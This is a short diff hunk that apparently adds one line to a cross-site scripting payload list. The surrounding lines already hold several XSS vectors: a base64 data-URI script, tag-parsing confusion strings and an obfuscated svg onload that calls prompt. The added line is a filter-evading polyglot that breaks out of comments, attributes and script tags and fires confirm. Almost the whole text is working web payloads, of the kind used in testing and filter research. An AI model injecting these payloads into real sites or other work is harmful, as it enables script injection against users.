@@ -188,3 +188,4 @@ alert;pg("XSS")
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
 <a<b<c> <! comment !> <? comment > </d id=e/> <f g = h > , <f g=<h>, or <f g=h> ? <script> alert(document.domain) <!-- this <script> actually alert(document.domain) </script> means --> ? alert(document.domain) </script>
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
